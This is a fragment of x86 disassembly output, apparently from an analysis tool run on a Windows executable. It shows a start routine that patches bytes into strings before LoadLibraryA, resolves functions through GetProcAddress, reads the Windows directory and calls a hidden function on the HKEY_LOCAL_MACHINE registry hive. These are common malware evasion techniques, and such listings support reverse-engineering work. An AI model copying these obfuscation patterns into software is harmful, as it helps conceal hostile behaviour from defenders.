0x00401450:	pushl	%ebp	; from: 0x004015b6(MAY)
0x00401451:	movl	%esp, %ebp
0x00401453:	movl	0xc(%ebp), %eax
0x00401456:	pushl	%eax
0x00401457:	movl	0x8(%ebp), %ecx
0x0040145a:	pushl	%ecx
0x0040145b:	call	0x0042c260	; targets: 0xff000bd0(MAY)
0x00401461:	popl	%ebp
0x00401462:	ret	; targets: 0x004015bb(MAY)


start:
0x00401490:	pushl	%ebp
0x00401491:	movl	%esp, %ebp
0x00401493:	subl	$0x88, %esp
0x00401499:	movl	$0x0, -20(%ebp)
0x004014a0:	movl	$0x64, -132(%ebp)
0x004014aa:	movl	$0x2, -24(%ebp)
0x004014b1:	movl	$0x0, -4(%ebp)
0x004014b8:	movl	$0x0, -44(%ebp)
0x004014bf:	movl	$0xffff, -136(%ebp)
0x004014c9:	movl	$0x42c140, -100(%ebp)
0x004014d0:	movl	$0x42c150, -32(%ebp)
0x004014d7:	movl	$0x2d, -12(%ebp)
0x004014de:	movl	$0x21, -8(%ebp)
0x004014e5:	movl	$0x2d, -56(%ebp)
0x004014ec:	movl	0x8(%ebp), %ecx
0x004014ef:	movl	%ecx, 0x0042c26c
0x004014f5:	movl	$0x0, 0x0042c3a4
0x004014ff:	movl	$0xffffffff, 0x0042c284
0x00401509:	movl	0x0042c26c, %eax
0x0040150e:	andl	-136(%ebp), %eax
0x00401514:	je	0x00401522	; targets: 0x00401522(MAY)
0x00401522:	movl	$0x1, 0x0042c274	; from: 0x00401514(MAY)
0x0040152c:	cmpl	$0x0, 0x0042c26c
0x00401533:	jne	0x0040153f	; targets: 0x00401535(MAY)
0x00401535:	movl	$0x0, 0x0042c274	; from: 0x00401533(MAY)
0x0040153f:	movl	GetProcAddress@kernel32.dll, %ecx
0x00401545:	movl	%ecx, 0x0042c260
0x0040154b:	movl	$0x404005, 0x0042c284
0x00401555:	pushl	$0x104
0x0040155a:	pushl	$0x42c2a0
0x0040155f:	call	GetWindowsDirectoryA@kernel32.dll	; targets: 0xff000af0(MAY)
0x00401565:	pushl	$0x42c15c
0x0040156a:	pushl	$0x42c2a0
0x0040156f:	call	lstrlenA@kernel32.dll	; targets: 0xff000b10(MAY)
0x00401575:	addl	$0x42c2a0, %eax
0x0040157a:	pushl	%eax
0x0040157b:	call	lstrcpyA@kernel32.dll	; targets: 0xff000b30(MAY)
0x00401581:	movl	-56(%ebp), %edx
0x00401584:	pushl	%edx
0x00401585:	movl	-8(%ebp), %eax
0x00401588:	pushl	%eax
0x00401589:	leal	-12(%ebp), %ecx
0x0040158c:	pushl	%ecx
0x0040158d:	call	InterlockedCompareExchange@kernel32.dll	; targets: 0xff000b50(MAY)
0x00401593:	movl	-100(%ebp), %edx
0x00401596:	movb	$0x61, (%edx)
0x00401599:	movl	-100(%ebp), %eax
0x0040159c:	movb	$0x69, 0x5(%eax)
0x004015a0:	movl	-32(%ebp), %ecx
0x004015a3:	movb	$0x6e, 0x6(%ecx)
0x004015a7:	movl	-32(%ebp), %edx
0x004015aa:	pushl	%edx
0x004015ab:	movl	-100(%ebp), %eax
0x004015ae:	pushl	%eax
0x004015af:	call	LoadLibraryA@kernel32.dll	; targets: 0xff000c40(MAY)
0x004015b5:	pushl	%eax
0x004015b6:	call	0x00401450	; targets: 0x00401450(MAY)
0x004015bb:	addl	$0x8, %esp	; from: 0x00401462(MAY)
0x004015be:	movl	%eax, 0x0042c288
0x004015c3:	movl	$0x53, %ecx
0x004015c8:	movl	0x0042c13c, %edx
0x004015ce:	movw	%cx, (%edx)
0x004015d1:	leal	-16(%ebp), %eax
0x004015d4:	pushl	%eax
0x004015d5:	movl	0x0042c13c, %ecx
0x004015db:	pushl	%ecx
0x004015dc:	pushl	$0x80000002
0x004015e1:	call	0x0042c288	; targets: 0x00000000(MAY)
